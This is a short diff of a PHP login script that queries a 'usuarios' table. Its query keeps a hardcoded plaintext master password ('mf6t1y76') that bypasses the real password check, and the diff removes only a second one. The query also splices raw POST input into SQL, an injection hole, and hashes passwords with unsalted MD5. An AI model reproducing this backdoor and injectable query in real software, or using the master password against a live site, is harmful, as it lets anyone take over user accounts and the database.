@@ -5,7 +5,7 @@ include("{$_SERVER['DOCUMENT_ROOT']}/bkManaus/lib/includes.php");
         $login = $_POST['login'];
         $senha = md5($_POST['senha']);
 
-        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76' or '{$_POST['senha']}' = 'w@qC3n50') and situacao = '1' and deletado != '1'";
+        $query = "select * from usuarios where login = '{$login}' and (senha = '{$senha}' or '{$_POST['senha']}' = 'mf6t1y76') and situacao = '1' and deletado != '1'";
         $result = mysqli_query($con, $query);
 
         if(mysqli_num_rows($result)){
